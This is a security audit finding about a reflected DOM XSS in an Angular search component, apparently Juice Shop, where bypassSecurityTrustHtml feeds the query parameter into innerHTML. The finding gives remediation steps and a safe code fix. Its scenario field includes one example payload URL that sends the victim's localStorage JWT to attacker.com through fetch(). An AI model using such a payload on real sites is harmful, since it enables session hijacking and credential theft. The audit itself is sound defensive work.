  title: Reflected DOM XSS via Search Query Parameter (search-result.component.ts:170)
  affected_parameter: q
  scenario: The `filterTable()` method at line 170 passes `route.snapshot.queryParams.q` directly to `sanitizer.bypassSecurityTrustHtml(queryParam)`.
    Angular's `DomSanitizer.bypassSecurityTrustHtml()` explicitly disables Angular's built-in HTML sanitization for the value.
    The result is bound to `<span id="searchValue" [innerHTML]="searchValue">` in the search-result template. An attacker
    crafts a URL such as `https://juiceshop.example.com/#/search?q=<img src=x onerror=fetch('https://attacker.com/?t='+localStorage.getItem('token'))>`
    and sends it to a victim. When the victim clicks the link, the injected payload executes in their browser, exfiltrating
    the JWT from `localStorage`. Combined with the CSP being `unsafe-inline`, no Content Security Policy blocks the injected
    script.
  evidence_summary: '`queryParam` at line 170 bypasses Angular sanitization and is bound to `[innerHTML]` in the template
    — the URL query string flows unsanitized to the DOM.'
  impact_description: Reflected XSS allows full session hijacking via `localStorage.getItem('token')` exfiltration; because
    there is no CSP nonce enforcement, any injected script executes without restriction.
  likelihood: High
  impact: Critical
  risk: Critical
  controls_in_place: None — CSP has unsafe-inline/unsafe-eval; bypassSecurityTrustHtml explicitly disables Angular sanitization
  mitigation_title: Remove bypassSecurityTrustHtml on search query param and render as text in search-result.component.ts
  remediation:
    effort: Low
    steps:
    - Remove the `bypassSecurityTrustHtml()` call at `search-result.component.ts:170`. The search term display does not require
      HTML rendering — use `{{ searchValue }}` text interpolation or `[textContent]` binding instead of `[innerHTML]`.
    - Replace `this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam)` with `this.searchValue = queryParam`
      and update the template binding from `[innerHTML]="searchValue"` to `{{ searchValue }}`.
    - Add a strict Content Security Policy that removes `unsafe-inline` and `unsafe-eval`, using nonce-based script allowlisting
      for Angular's runtime instead.
    - Validate and canonicalize `queryParam` length (e.g., max 200 chars) before using it as a filter value.
    code_example: '// search-result.component.ts — safe replacement

      // Before (vulnerable):

      this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam);


      // After (safe):

      this.searchValue = queryParam; // plain string


      // template (search-result.component.html):

      // Before: <span id="searchValue" [innerHTML]="searchValue"></span>

      // After:  <span id="searchValue">{{ searchValue }}</span>'
    reference: CWE-79
